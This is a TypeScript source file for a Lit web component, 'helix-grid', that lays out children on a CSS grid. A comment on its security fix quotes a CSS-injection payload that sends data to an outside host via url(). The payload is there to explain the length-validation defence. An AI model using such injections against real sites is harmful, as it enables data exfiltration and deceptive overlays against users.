import { customElement, HelixElement } from '@fusion.dev/helix-core'
import type { CSSResultGroup, PropertyValues, TemplateResult } from 'lit'
import { html } from 'lit'
import { property } from 'lit/decorators.js'
import { styles } from './grid-root.css.js'

/**
 * @summary A layout that places its children on a grid.
 *
 * @description
 * Set columns in one of two ways:
 *
 * - `columns` sets a fixed count.
 * - `min` fits as many equal columns as there is room for at that width, so the
 *   layout responds with no breakpoints to maintain.
 *
 * If you set both, `min` wins. The grid is presentation only, so there is no
 * headless tier.
 *
 * @since 0.1.0
 * @status stable
 * @category layout
 * @aliases Layout, Columns
 * @documentation https://fusion.dev/helix/components/grid
 *
 * @slot - The items to lay out.
 *
 * @cssproperty --grid-columns - An explicit track list. It overrides `min` and `columns`. Use it for tracks of unequal widths, which neither attribute can set.
 */
@customElement('helix-grid')
export class HelixGrid extends HelixElement {
  /**
   * How each cell aligns within its row. Sets `align-items`.
   *
   * **Named for the CSS property it sets**, the way `Flex` is, and the same
   * property on a grid: it places every cell in its row's track rather than
   * placing the tracks. No `baseline`, which `Flex` offers, because cells in a
   * row of a grid are boxes of unrelated content and lining their first lines
   * up is a thing a reader asks for between siblings in a row, not between
   * cells in a table of them.
   *
   * There is no `justifyContent` here for the same reason: the tracks are
   * `1fr`, so they already fill the row and there is nothing left over to
   * distribute. `columns`, `min` and `--grid-columns` are how a grid says how
   * wide its tracks are.
   */
  @property({ attribute: 'align-items', reflect: true })
  alignItems?: 'start' | 'center' | 'end' | 'stretch'

  /**
   * A fixed number of equal columns.
   */
  @property({ reflect: true, type: Number })
  columns?: number

  /**
   * The space between cells, as a step on the space scale.
   */
  @property({ reflect: true })
  gap?: 'none' | '2xs' | 'xs' | 'sm' | 'md' | 'lg' | 'xl' | '2xl' | '3xl'

  /**
   * The minimum column width. The grid fits as many columns as the width allows.
   *
   * Takes precedence over `columns`: a grid that both fixes a count and reflows
   * is two intentions in one element.
   */
  @property()
  min = ''

  /**
   * Writes the track list into the shadow root's own stylesheet.
   *
   * Into a `<style>` rather than onto `this.style`, and the difference is
   * hydration. An inline style on the host is an attribute the element gives
   * itself once it upgrades, so a React consumer's server markup does not have
   * it and hydration reports a mismatch it will not patch up. The shadow root
   * is not part of the tree React hydrates, so a rule written there is free.
   *
   * The element is filled imperatively because Lit refuses expressions inside
   * `<style>`: it is an invalid binding location and throws while rendering
   * rather than at build time. Hence a static, empty element in the template
   * and its `textContent` set here.
   *
   * It sets a custom property rather than the track list itself. A shadow
   * root's adopted stylesheets cascade *after* its own `<style>` elements, and
   * `static styles` is adopted, so a `grid-template-columns` here lost to the
   * one in the stylesheet and every `min` grid came out a single column. The
   * stylesheet only ever reads `--_grid-template`, so there is nothing to
   * lose against.
   *
   * The consequence is that a server-rendered grid falls back to the
   * stylesheet's single column until it upgrades. That is why `columns` is also
   * expressed as plain CSS below: the fixed-count case, which can be enumerated,
   * needs no JavaScript at all, and only `min` depends on this.
   */
  private applyTemplate(): void {
    const sheet = this.renderRoot.querySelector<HTMLStyleElement>('#template')
    if (!sheet) {
      return
    }
    /* **`min` is checked against a length before it reaches a stylesheet, and
       that is a security fix rather than tidiness.** It is a public attribute
       and it was concatenated into a `<style>` element's text, so
       `min="1px,1fr)} :host{background:url(//elsewhere/?stolen)} @media all{"`
       closed the rule and wrote arbitrary CSS into this component's shadow
       root. That is enough to exfiltrate through `url()` and to lay an
       invisible plate over the page.
     *
     * `createSheet` says in its own documentation that consumer input must not
     * be interpolated into CSS, and this was the one place in the library that
     * did it. A pattern rather than an escape, because a length has a small,
     * known grammar and anything outside it is a mistake worth ignoring rather
     * than a string worth repairing. */
    const length = /^-?(?:\d+\.?\d*|\.\d+)(?:px|r?em|%|v[hw]|ch|ex|cm|mm|in|pt|pc|q)$/i
    const min = this.min?.trim() ?? ''
    sheet.textContent =
      min !== '' && length.test(min)
        ? `:host { --_grid-template: repeat(auto-fit, minmax(min(${min}, 100%), 1fr)); }`
        : ''
  }

  /* `updated` alone, and never a `firstUpdated` beside it. Lit puts every
     initial property into the first `changed`, so the pair runs
     `applyTemplate` twice on every mount of a grid with a `min`. */
  protected override updated(changed: PropertyValues): void {
    super.updated(changed)
    if (changed.has('min')) {
      this.applyTemplate()
    }
  }

  protected override render(): TemplateResult {
    return html`<style id="template"></style>
      <slot></slot>`
  }

  static override styles: CSSResultGroup = styles
}

declare global {
  interface HTMLElementTagNameMap {
    'helix-grid': HelixGrid
  }
}
